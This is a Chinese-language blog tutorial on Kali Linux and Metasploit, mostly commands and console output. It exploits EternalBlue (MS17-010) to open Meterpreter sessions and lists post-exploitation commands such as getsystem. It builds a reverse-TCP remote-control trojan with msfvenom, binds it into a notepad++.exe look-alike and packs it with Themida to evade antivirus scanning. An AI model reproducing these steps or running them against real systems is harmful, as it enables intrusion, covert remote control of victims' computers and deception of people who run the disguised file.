---
layout: post
title: Kali和metepreter的使用
date: 2024-05-08 11:20:44
categories:  
  - 网络安全
---

### 初识[Kali](https://www.kali.org/)

![](https://t.tutu.to/img/ViNI)

### 安装

下载并安装VMware 17虚拟机，下载Kali VMware镜像，导入，运行即可

![](https://img2.imgtp.com/2024/05/08/Py18i4iz.png)

### Kali 中的 metasploit 工具

> 简介：msf是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。
>
> metasploit让复杂的漏洞攻击流程变的非常简单，一个电脑小白经过几小时的学习，就能对操作系统等主流漏洞发起危害性攻击

#### 使用方法

> msf使用法则:使用模块 ->配置模块必选项 ->运行模块

1. 打开终端
2. 提升权限

```sh
sudo su
```

3. 打开metasploit

```sh
msfconsole
```

4. 效果

![](https://img2.imgtp.com/2024/05/08/hYjvDtzV.png)

#### 经典案例：永恒之蓝漏洞

>  查到漏洞

```sh
search ms17_010
```

![](https://img2.imgtp.com/2024/05/08/QaGrcPUy.png)

> 使用模块

```
use 0
or
use exploit/windows/smb/ms17_010_eternalblue
```

> 查看设置

```
options
```

![](https://img2.imgtp.com/2024/05/08/aPXOeWy5.png)

![](https://img2.imgtp.com/2024/05/08/su9Fv2bM.png)

> 参数

| 参数   | 说明           |
| ------ | -------------- |
| Rhosts | 攻击目标的IP   |
| Rport  | 攻击目标的端口 |
| Lhost  | Kali当前IP     |
| Lport  | Kali当前端口   |

> 示例

```sh
set RHOSTS 192.168.2.214
set RPORT 10001
```

#### 结果

##### 攻击成功

```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.126.128:4444 
[*] 192.168.126.131:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.126.131:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.126.131:445   - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.126.131:445 - The target is vulnerable.
[*] 192.168.126.131:445 - Connecting to target for exploitation.
[+] 192.168.126.131:445 - Connection established for exploitation.
[+] 192.168.126.131:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.126.131:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.126.131:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.126.131:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.126.131:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.126.131:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.126.131:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.126.131:445 - Sending all but last fragment of exploit packet
[*] 192.168.126.131:445 - Starting non-paged pool grooming
[+] 192.168.126.131:445 - Sending SMBv2 buffers
[+] 192.168.126.131:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.126.131:445 - Sending final SMBv2 buffers.
[*] 192.168.126.131:445 - Sending last fragment of exploit packet!
[*] 192.168.126.131:445 - Receiving response from exploit packet
[+] 192.168.126.131:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.126.131:445 - Sending egg to corrupted connection.
[*] 192.168.126.131:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 192.168.126.131
[+] 192.168.126.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.126.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.126.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 3 opened (192.168.126.128:4444 -> 192.168.126.131:49159) at 2024-05-08 05:57:20 -0400
```

##### 攻击失败

```sh
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.126.128:4444 
[*] 192.168.2.214:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.2.214:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.2.214:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.2.214:445 - The target is vulnerable.
[*] 192.168.2.214:445 - Connecting to target for exploitation.
[+] 192.168.2.214:445 - Connection established for exploitation.
[+] 192.168.2.214:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.2.214:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.2.214:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.2.214:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.2.214:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.2.214:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.2.214:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.2.214:445 - Sending all but last fragment of exploit packet
[*] 192.168.2.214:445 - Starting non-paged pool grooming
[+] 192.168.2.214:445 - Sending SMBv2 buffers
[+] 192.168.2.214:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.2.214:445 - Sending final SMBv2 buffers.
[*] 192.168.2.214:445 - Sending last fragment of exploit packet!
[*] 192.168.2.214:445 - Receiving response from exploit packet
[+] 192.168.2.214:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.2.214:445 - Sending egg to corrupted connection.
[*] 192.168.2.214:445 - Triggering free of corrupted buffer.
[-] 192.168.2.214:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.2.214:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 192.168.2.214:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

> 攻击失败

```sh
[*] Started reverse TCP handler on 192.168.126.128:4444 
[*] 192.168.2.214:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 192.168.2.214:445     - Host does NOT appear vulnerable.
[*] 192.168.2.214:445     - Scanned 1 of 1 hosts (100% complete)
[-] 192.168.2.214:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
```

> 连接超时

```sh
[*] Started reverse TCP handler on 192.168.126.128:4444 
[*] 192.168.2.178:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 192.168.2.178:445     - Rex::ConnectionTimeout: The connection with (192.168.2.178:445) timed out.
[*] 192.168.2.178:445     - Scanned 1 of 1 hosts (100% complete)
[-] 192.168.2.178:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
```

#### 容易出现的报错解决方案

1. 关闭`防火墙`
2. 设置`网络连接`在`共享网络连接`

### 使用meterpreter

| 命令       | 说明                                 |
| ---------- | ------------------------------------ |
| ps         | 列出进程                             |
| shell      | 打开cmd                              |
| powershell | 打开powershell                       |
| shutdown   | 关机 ：/s /t 0 ：立即关机   /r  重启 |
| getsystem  | 提权                                 |
| ifconfig   | 获取网络接口配置                     |

#### 问题

> 没有权限，没有解决

```sh
meterpreter > shutdown
Shutting down...
[-] stdapi_sys_power_exitwindows: Operation failed: 1314
```

### msfvenom生成远控木马

> 命令

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.126.128 -f exe -o demo.exe
```

![](https://s21.ax1x.com/2024/05/08/pkVdYPf.png)

> 生成的文件：payload.exe  （名字改了）

![](https://s21.ax1x.com/2024/05/09/pkVo5ge.png)

### multi/handler进行监控

> 启动插件

```sh
# 进入msf
msfconsole

#启动插件
use exploit/multi/handler
```

> 设置pyload

```sh
set payload windows/x64/meterpreter/reverse_tcp

set lhost 192.168.126.128
```

> 成功示例

```sh
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.126.128
lhost => 192.168.126.128
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.126.128  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.126.128:4444 
[*] Sending stage (201798 bytes) to 192.168.126.132
[*] Meterpreter session 1 opened (192.168.126.128:4444 -> 192.168.126.132:50199) at 2024-05-09 01:43:30 -0400

meterpreter > 
```

### 捆绑木马

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.126.126 -f exe -x notepad++.exe -o notepad++.exe
```

> -x notepad.exe ：指捆绑到notepad.exe这个文件中

### 使用Themida保护文件防查杀（已失效）

>  [Themida官网下载](https://www.oreans.com/themida.php)

![](https://s21.ax1x.com/2024/05/09/pkVbQVs.png)

> 打开程序

![](https://s21.ax1x.com/2024/05/09/pkVbsG6.png)

> 将文件拖拽进程序中，加密即可

![](https://s21.ax1x.com/2024/05/09/pkVbyRK.png)

> 得到 demo_protected.exe  运行即可
